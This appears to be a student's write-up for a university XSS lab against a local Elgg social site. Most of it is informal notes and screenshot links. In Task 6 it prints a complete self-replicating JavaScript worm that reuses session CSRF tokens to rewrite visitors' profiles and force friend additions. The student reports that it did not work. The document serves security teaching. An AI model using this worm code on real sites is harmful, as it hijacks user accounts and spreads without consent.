
<div align="center">Lab 05 | CSCI 476
  
Zoe Norden | s68k193() 
</div>


## Task 1

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task1.1.png)

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task1.png)

I wasn't sure if I need tod o the more advanced thing with the separate file or anything. Given that it didn't say so in the instructions, I will assume I did not need to do so. So far this seems very similar to the SQL injection thing that we did on the last lab.

Is it possible to do a more advanced version of this using the larger script file thing and then insert a video or something? I wouldn't be able to get it to work with the existing field because I'd run into a character limit on my space, but I should be able to run something if I tossed it into a file to run. I am curious if I could get the actual video to pop up or if it'd just be the link to the video, which wouldn't be as funny. 

## Task 2

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task2.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task2.1.png)

I still don't quite understand the dangers behind cookies. 

## Task 3

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task3.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task3.1.png)

I can kind of see why knowing this info would be dangerous though. 


## Task 4

### Task 4.1

Our first image is pre-friend Boby and the second image is after we've added Boby as a friend. 
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.1.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.1.2.png)

Now here's a code block of the code that I inserted. There is also a screenshot of the full code snippet below that textblock of code. From what I understand, this code looks at the url and then goes to add friend withthe id number of 57. 

`var sendurl="http://www.xsslabelgg.com/action/friends/add" + "?friend=57" + token + ts;`

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.1.1.png)


### Task 4.2

For task 4.2 I was unable to successfully re-add Boby as a friend. To try and accomplish this, I removed the code from the "edit HTML" section and just directly pasted it in Samy's bio. I also removed Boby as a friend before I used this attack to verify things. I was unable to readd Boby as a friend if I just pasted it in the normal About me field. As you can see from the screenshots, I am still friendless. 

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.2.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task4.2.1.png)

## Task 5


### Task 5.1

Once again, we will be targetting poor Boby. As you can see from the screenshot below, Boby has a very poor MySpace-esque profile page. Let's see if we can't spice things up. You know, once he visits Samy's profile.

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.png)
![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.1.png)

Okay, so I had to create the variable desc which is our description variable. This is because I honestly couldn't tell if the `var name, guid, ts, token` was actually doing anything so I created the `var desc` which would directly edit the profile of poor Boby. Full code snippet is below. 

![image](https://github.com/znorden17/csci-476-594-spring2021-private/blob/main/lab05/screenshots/task5.1.2.png)


### Task 5.2

You need this line of code because if you didn't have it, you would attack yourself. So this is basically saying that if the user id is not Samy's, then we continue with the attack, but if it is, we do not do anything. This was probably the hardest part for me to figure out for some reason because I couldn't figure out what Samy's GUID was for the life of me. 

## Task 6

For all intents and purposes - this should work. I probably missed a quotation somewhere and that's why it's not working. Or maybe I just spelled something incorrectly, but I've been staring at code that, for all intents and purposes, should absolutely work. And yet, it's frusturating that it doesn't. 

What this should do is that if someone vists Samy's profile, then their stuff gets edited. So if Boby visists Samy's profile then he gets his descriptions edited and whatnot. And then if Alice visits Boby's profile, then her information also gets edited and so on and so forth. There's this giant chain of people that get infected by poor Samy over there. 

That's what, again, should happen. Unfortunately for me that does not seem to be the case. Regretfully. 

```js

<script id=worm>
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  // (1)
    var jsCode = document.getElementById("worm").innerHTML;           // (2)
    var tailTag = "</" + "script>";                                   // (3)

    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  // (4)   
 var username=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    // TODO: Set the content of the description field and access level.
    var desc="&description=Zoe was here again" + wormCode;
    desc+= "&accesslevel[description]=2";
    var samyGuid=59;
    var name="&name="+username
    // TODO: Set the URL, and create and send Ajax request to modify profile
    var sendurl="http://www.xsslabelgg.com/action/profile/edit";
    var content=token+ts+name+desc+guid
    if (elgg.session.user.guid!=samyGuid)       // (1)
    {
        // Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }

    // TODO: Set the URL, and create and send Ajax request to add Samy as a friend
    sendurl="http://www.xsslabelgg.com/action/friends/add?friend=59"+ts+token;

    Ajax=new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();

</script>
```
